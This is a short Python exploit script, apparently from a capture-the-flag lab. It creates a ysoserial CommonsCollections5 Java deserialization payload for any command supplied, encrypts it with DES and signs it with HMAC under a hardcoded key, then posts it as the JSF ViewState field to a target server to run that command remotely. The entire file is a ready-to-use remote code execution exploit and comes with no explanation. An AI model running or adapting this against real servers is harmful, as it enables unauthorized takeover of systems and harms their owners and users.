#!/usr/bin/python
from __future__ import print_function
from Crypto.Cipher import DES
import base64
import hashlib
import hmac
import sys
import subprocess
import requests

def pad(s): # per standard PKCS#5 is padding to blocksize 8, PKCS#7 is for any block size 1 to 255
        return s + (block_size - len(s) % block_size) * chr(block_size - len(s) % block_size)

if len(sys.argv) < 2:
    print("Usage: ./viewstate_exploit.py <command>")
    exit(0)

command = sys.argv[1]
block_size = DES.block_size
key = "JsF9876-"
des = DES.new(key, DES.MODE_ECB)
host = "http://10.10.10.130:8080/userSubscribe.faces"

ysoserial_payload = subprocess.Popen(["/usr/bin/java", "-jar", "/root/Tools/ysoserial.jar", "CommonsCollections5", command], stdout=subprocess.PIPE).communicate()[0]
encpayload = des.encrypt(pad(ysoserial_payload))
hmac_n = hmac.new(key, encpayload, hashlib.sha1)
digest = hmac_n.digest()

signed_payload = encpayload + digest

fpayload = base64.b64encode(signed_payload)
print("Your payload:")
print(fpayload)

print("Sending payload... ", end="")
data = {
    'j_id_jsp_1623871077_1:email': 'ciao@ciao.it',
    'j_id_jsp_1623871077_1:submit': 'SIGN UP',
    'j_id_jsp_1623871077_1_SUBMIT': 1,
    'javax.faces.ViewState': fpayload
}
res = requests.post(host, data=data)
print("Done.")
